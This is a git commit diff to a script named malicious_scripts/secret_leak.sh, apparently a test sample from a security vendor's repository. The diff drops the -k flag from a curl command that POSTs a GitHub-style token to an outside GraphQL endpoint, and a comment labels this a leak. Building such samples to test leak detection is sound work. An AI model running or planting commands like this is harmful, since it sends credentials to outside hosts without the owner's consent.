f09814ccdff9faa8d4596438448a921b6c17bf30
ir-paras-oli <paras.oli@invisirisk.com>
2025-04-03 12:48:14 +0545

    Update secret_leak.sh

--- malicious_scripts/secret_leak.sh
+++ malicious_scripts/secret_leak.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Sending a POST request with a GitHub token (LEAK)
-curl -k -X POST https://api.veribom.com/graphql \
+curl -X POST https://api.veribom.com/graphql \
   -H "Content-Type: application/json" \
   -d '{
     "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
